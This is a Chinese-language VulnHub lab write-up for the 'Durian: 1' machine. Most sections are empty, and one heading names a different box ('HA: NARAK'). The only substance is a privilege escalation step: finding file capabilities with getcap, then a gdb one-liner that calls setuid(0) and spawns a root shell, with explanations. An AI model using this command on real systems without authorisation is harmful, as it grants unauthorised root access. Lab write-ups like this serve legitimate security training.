# 原创
：  VulnHub渗透测试实战靶场-Durian：1

# VulnHub渗透测试实战靶场-Durian：1

#### VulnHub渗透测试实战靶场-Durian：1

## 环境下载

> 



## HA：NARAK靶机搭建

> 



## 渗透测试

### 信息搜集

> 



> 



> 



### 漏洞挖掘

> 



> 



> 



### getshell

> 



> 



### 提权

> 



```
getcap -r / 2&gt;/dev/null
gdb -nx -ex 'python import os;os.setuid(0)' -ex '!bash' -ex quit 

```

```
getcap -r / 2&gt;/dev/null
getcap:查看可执行文件获取的内核权限
r：代表顶层目录
2&gt;/dev/null:就是将标准错误stderr删掉

gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
gdb:简单理解就是可以启动程序并且按照自己的自定义随心所欲的运行程序
-nx:不要从任何.gdbinit初始化文件执行命令
-ex"执行给定的GDB命令
简单理解就是首先利用gdb的权限去执行命令：命令的作用是利用python 设置一个uid为0（就是root）的shell

```
